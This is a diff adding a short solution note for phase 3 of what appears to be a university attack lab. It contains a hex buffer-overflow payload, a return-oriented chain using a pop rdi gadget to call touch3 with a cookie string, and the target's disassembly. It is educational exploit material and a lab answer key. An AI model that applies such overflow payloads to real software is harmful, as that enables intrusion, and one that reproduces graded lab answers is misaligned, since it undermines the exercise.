@@ -1,0 +1,36 @@
+Attack 3 solution:
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7e 27 40 00 00 00 00 00 38 54 64 55 00 00 00 00 7d 17 40 00 00 00 00 00 37 35 34 65 37 64 64 64
+
+
+touch 3:assembly code:
+   0x000000000040177d <+0>:   push   %rbx
+   0x000000000040177e <+1>: mov    %rdi,%rbx
+   0x0000000000401781 <+4>: movl   $0x3,0x202951(%rip)        # 0x6040dc ~<vlevel>~
+   0x000000000040178b <+14>:    mov    %rdi,%rsi
+   0x000000000040178e <+17>:    mov    0x202950(%rip),%edi        # 0x6040e4 ~<cookie>~
+   0x0000000000401794 <+23>:    callq  0x401701 ~<hexmatch>~
+   0x0000000000401799 <+28>:    test   %eax,%eax
+   0x000000000040179b <+30>:    je     0x4017bb <touch3+62>
+   0x000000000040179d <+32>:    mov    %rbx,%rsi
+   0x00000000004017a0 <+35>:    mov    $0x402e30,%edi
+   0x00000000004017a5 <+40>:    mov    $0x0,%eax
+   0x00000000004017aa <+45>:    callq  0x400c40 [printf@plt]
+   0x00000000004017af <+50>:    mov    $0x3,%edi
+   0x00000000004017b4 <+55>:    callq  0x401a87 ~<validate>~
+   0x00000000004017b9 <+60>:    jmp    0x4017d7 <touch3+90>
+   0x00000000004017bb <+62>:    mov    %rbx,%rsi
+   0x00000000004017be <+65>:    mov    $0x402e58,%edi
+   0x00000000004017c3 <+70>:    mov    $0x0,%eax
+   0x00000000004017c8 <+75>:    callq  0x400c40 [printf@plt]
+   0x00000000004017cd <+80>:    mov    $0x3,%edi
+
+
+overflow part:
+p64(0x40277e) + p64(0x55645438) + p64(0x40177d) + '754e7ddd'
+
+pop rdi； 
+ret;
+
+so the first return address was changed into 0x40277e
+the first 24 numbers can be random.
